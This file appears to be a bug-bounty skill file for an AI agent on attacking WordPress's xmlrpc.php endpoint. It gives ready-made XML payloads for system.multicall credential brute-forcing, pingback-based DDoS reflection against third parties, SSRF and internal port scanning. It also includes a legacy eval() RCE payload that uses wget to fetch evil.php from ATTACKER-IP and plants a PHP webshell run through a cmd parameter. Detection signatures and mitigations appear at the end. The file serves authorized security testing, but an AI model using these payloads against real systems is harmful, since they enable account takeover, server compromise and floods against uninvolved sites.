---
name: xmlrpc-abuse-testing
description: Abusing WordPress's `/xmlrpc.php` endpoint — a single unauthenticated XML-RPC interface that bundles five distinct attack primitives behind one URL: `system.multicall` brute-force-rate-limit-bypass amplification, `pingback.ping`-driven DDoS amplification against a third party, SSRF via the same pingback mechanism, internal port scanning (XSPA) via pingback timing/error behavior, and (on legacy PEAR XML_RPC/PHP XMLRPC library versions) arbitrary code execution via unsanitized eval(). Use this during Phase 3 (Vulnerability Testing — Auth/Server-side) of bughunting-workflow whenever tech-detect or `wpscan` confirms a WordPress target with `/xmlrpc.php` reachable and not disabled. Also trigger on mentions of xmlrpc.php, XML-RPC, system.multicall, pingback.ping, wp.getUsersBlogs, or XSPA.
---

# WordPress XML-RPC (`xmlrpc.php`) Abuse Testing

Technique library specific to WordPress's XML-RPC endpoint — worth its own skill because one endpoint hosts several structurally different vulnerability classes behind the same discovery step. Each dated entry below is a validated technique pulled from a real writeup/source — add new entries here (don't create a new skill) whenever a new writeup covers a *different* XML-RPC method or downstream escalation than what's already recorded.

## Core theory

`xmlrpc.php` exposes a generic remote-procedure-call interface that predates modern REST APIs and was never redesigned with today's abuse patterns in mind. Two of its built-in methods create most of the risk: `system.multicall` batches arbitrary numbers of method calls into a single HTTP request (originally a legitimate efficiency feature for tools like the WordPress mobile app), and `pingback.ping` makes the WordPress server itself issue an outbound HTTP GET to a URL you supply (originally for blog-to-blog "someone linked you" notifications). Both are unauthenticated by default. Combined, they turn one WordPress install into a force-multiplier: an attacker's single request can trigger dozens of internal auth checks (`system.multicall` batching login attempts) or make the server itself become the attack traffic's origin against a third party (`pingback.ping`).

## Discovery

**Confirm the endpoint is live:**
```bash
curl -X GET https://site.com/xmlrpc.php
```
A `"XML-RPC server accepts POST requests only"` response confirms it's live and reachable (a `404`/disabled-via-plugin response means this whole attack surface is closed).

**Enumerate available methods** (confirms which of the below are actually callable — some hardened installs disable specific methods like `pingback.ping` while leaving the endpoint itself up):
```bash
curl -X POST https://site.com/xmlrpc.php -d '<methodCall><methodName>system.listMethods</methodName></methodCall>'
```
```xml
<?xml version="1.0" encoding="utf-8"?>
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```

## Technique 1: brute-force amplification via `system.multicall`

A single `wp.getUsersBlogs` call tests one credential pair and returns an auth-success/failure signal:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>username</value></param>
<param><value>password</value></param>
</params>
</methodCall>
```
Wrapping many of these inside one `system.multicall` envelope lets an attacker test dozens-to-hundreds of credential pairs **in a single HTTP request** — which defeats any rate limiter keyed on request *count* rather than the number of distinct auth attempts embedded inside each request's body. See `rate-limit-bypass-testing` for the general rate-limit-evasion technique family; this is the WordPress-specific, protocol-level version of the same idea (the amplification is structural to XML-RPC batching, not a header/IP trick).

**Detecting a hit across the batch response:**
- Failed attempts return `"Incorrect username or password"` per sub-call.
- A successful login's response includes an `isAdmin` field — grep/sort the batch response by length or search for that field rather than eyeballing every sub-response individually, since a real hit is usually a longer, structurally different response than the uniform failures around it.

## Technique 2: DDoS amplification via `pingback.ping`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://victim.com</string></value></param>
<param><value><string>http://malicious-site.com/fake-post</string></value></param>
</params>
</methodCall>
```
The WordPress server itself issues a GET request to `http://victim.com` to "validate" the pingback. Send this same request to **many** WordPress sites simultaneously (each one becomes a distinct traffic source), and the victim receives a flood of GET requests originating from dozens/hundreds of legitimate-looking WordPress servers rather than the attacker's own infrastructure — classic amplification/reflection DDoS, with WordPress installs as the reflectors.

## Technique 3: SSRF via the same pingback mechanism

Swap the victim URL for attacker-controlled infrastructure to receive the callback directly, confirming the WordPress server made the outbound request and observing what it sends:
```xml
<param><value><string>http://ATTACKER-CONTROLLED-SERVER</string></value></param>
```
The server's own response indicates whether the pingback succeeded — that response-content difference (success vs. failure vs. timeout) is also the signal used for the port-scanning variant below. Cross-reference `ssrf-testing` for the general internal-network-probing/cloud-metadata-targeting methodology once basic SSRF via pingback is confirmed — from here you can retarget the "victim URL" parameter at `169.254.169.254`/internal service ports exactly as you would any other SSRF injection point.

**Discovery-pivot worth remembering** (source: [The Backdoor Nobody Locked: An Unauthenticated SSRF Story](https://freedium-mirror.cfd/https://medium.com/@srimansree0810/the-backdoor-nobody-locked-an-unauthenticated-ssrf-story-5df53c012b03)) — don't stop testing a WordPress target just because `/wp-login.php` and `/wp-admin/` return 403: a WAF/reverse-proxy rule set built around blocking the obvious admin-panel paths frequently leaves the legacy `/xmlrpc.php` endpoint completely unconsidered and reachable, even on an otherwise well-locked-down install. Confirm reachability first with `system.listMethods` (per the discovery check above), then proceed to `pingback.ping` as the actual SSRF primitive.

**Minimal, non-destructive PoC discipline for this specific vector:** an OOB interaction platform (Interactsh/`oastify.com`, Burp Collaborator) receiving the DNS lookup alone — `Target URL: http://[unique-id].oastify.com/`, `Source URL:` any reachable page on the target — is sufficient to prove unauthenticated SSRF exists; the DNS log entry alone (no HTTP callback needed) confirms "the request came from the target's infrastructure, not mine." When scope/authorization for deeper internal probing is uncertain, stop at this DNS-confirmation step rather than retargeting the payload at `169.254.169.254`/internal service ports — report the confirmed primitive and let the program's own team (or a follow-up authorized round) decide whether to escalate into internal-network/cloud-metadata probing.

## Technique 4: internal port scanning (XSPA) via pingback timing/error behavior

```xml
<string>https://website:port</string>
```
Sweep the port number across a wordlist (Burp Intruder) while watching the pingback response: a closed/filtered port produces an error or a timeout, while an open port behaves differently (faster response, different error text, or a completed pingback). This turns the WordPress server into a port-scanning proxy against hosts *it* can reach but you can't directly — most valuable when the WordPress install sits inside an internal network segment, since the scan results reveal that internal topology.

## Technique 5: RCE via legacy PEAR XML_RPC / PHP XMLRPC library `eval()` injection

Targets specifically **PEAR XML_RPC ≤1.3.0** and **PHP XMLRPC ≤1.1** — old library versions where the XML parser passes parsed data into `eval()` without sanitization (this is a library-version bug, not something present in a modern/patched WordPress core install — confirm the library version before spending time on this).

```xml
<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>test.method</methodName>
<params>
<param>
<value>
<name>',"));echo '_begin_';echo `cd /tmp;wget ATTACKER-IP/evil.php;chmod +x evil.php;./nikons `;echo '_end';exit;/*</name>
</value>
</param>
</params>
</methodCall>
```
Drops a backdoor (`evil.php`):
```php
<?php system($_GET['cmd']);?>
```
Then execute commands via:
```
http://target.com/evil.php?cmd=ls
```
Same file-drop/webshell caution as `file-upload-testing` and `post-access-impact` applies here — a minimal read-only proof (`cmd=id` / `cmd=whoami`) is sufficient for a bug bounty PoC; don't escalate to a persistent backdoor beyond what's needed to demonstrate impact.

## Detection/monitoring signatures (useful for confirming a finding is exploitable, and for writing the report's evidence section)

- Repeated POST requests to `/xmlrpc.php` with varying credential pairs inside `system.multicall` bodies.
- Unusual outbound-request spikes correlated with inbound `pingback.ping` calls (server logs show the server itself as a GET-request *source* against third-party URLs).
- Response-length/content anomalies across batched sub-responses (the `isAdmin` signal from Technique 1).

## Impact framing for report

- **Technique 1 (brute-force amplification):** frame as rate-limit bypass enabling credential stuffing/brute-force at scale — severity depends on whether a valid credential pair is actually recovered (High/Critical) vs. just demonstrating the amplification is possible (Medium).
- **Technique 2 (DDoS amplification):** demonstrate carefully and only within program authorization — a live amplification test against a real third party is a destructive action; most programs want a PoC against attacker-controlled infrastructure (Technique 3's variant) rather than an actual flood, so default to that unless the program explicitly scopes DDoS testing.
- **Technique 3 (SSRF):** same severity scaling as any other SSRF finding — see `ssrf-testing`'s impact framing (cloud IAM credential theft > internal service access > blind confirmation only).
- **Technique 4 (port scan/XSPA):** Medium — internal network topology disclosure, severity rises if it reveals unexpected internally-exposed admin panels/services.
- **Technique 5 (RCE):** Critical if the legacy library version is confirmed present and the PoC lands — full server compromise.

## Mitigation notes (for the report's remediation section)

```
<Files xmlrpc.php>
    order deny,allow
    deny from all
</Files>
```
Also: rate limiting via Fail2Ban/Cloudflare WAF specifically on `/xmlrpc.php`, IP-allowlisting the endpoint if legitimate integrations need it (rather than leaving it open to the internet), a WAF rule set with XML-RPC-specific detection, or disabling the endpoint entirely via a plugin ("Disable XML-RPC") if no legitimate use case exists — most sites don't actually need it enabled.

## Recorded techniques

### 1. Full XML-RPC abuse chain: brute-force amplification, DDoS/SSRF/port-scan via pingback, legacy-library RCE (baseline)
Source: [How Hackers Abuse XML-RPC to Launch Bruteforce and DDoS Attacks](https://infosecwriteups.com/how-hackers-abuse-xml-rpc-to-launch-bruteforce-and-ddos-attacks-40be5b310960)

**Where:** any WordPress target with `/xmlrpc.php` reachable and not disabled — confirm via the discovery check above before assuming any of the five techniques apply.

**Root cause:** `xmlrpc.php` bundles unauthenticated batch-call (`system.multicall`) and server-side-outbound-request (`pingback.ping`) primitives that predate modern rate-limiting/SSRF-hardening practices, plus (on old library versions specifically) an unsanitized `eval()` code path.

**Exploit steps:** confirm the endpoint is live and enumerate methods, then work through Techniques 1-5 in order of least-to-most destructive/risky (brute-force amplification and SSRF-against-attacker-infra first; DDoS-against-real-third-party and destructive RCE PoCs last and only with explicit authorization).

**Impact framing for report:** see per-technique breakdown above — this endpoint routinely yields multiple independent findings from one discovery step, so report each applicable technique as its own finding rather than bundling them into one generic "XML-RPC enabled" report.

**Generalize note:** the `system.multicall` batching-defeats-rate-limiting pattern generalizes to any other API that supports batch/bulk operations (GraphQL batched queries, REST APIs with a `/batch` endpoint) — whenever a target exposes bulk-operation support, check whether it's rate-limited per-operation or only per-HTTP-request, using the same "wrap many attempts inside one request" logic as here.

<!-- Add new recorded techniques below this line as new XML-RPC-abuse writeups are processed. Keep the same structure: Where / Root cause / Exploit steps / Impact framing / Generalize note. -->
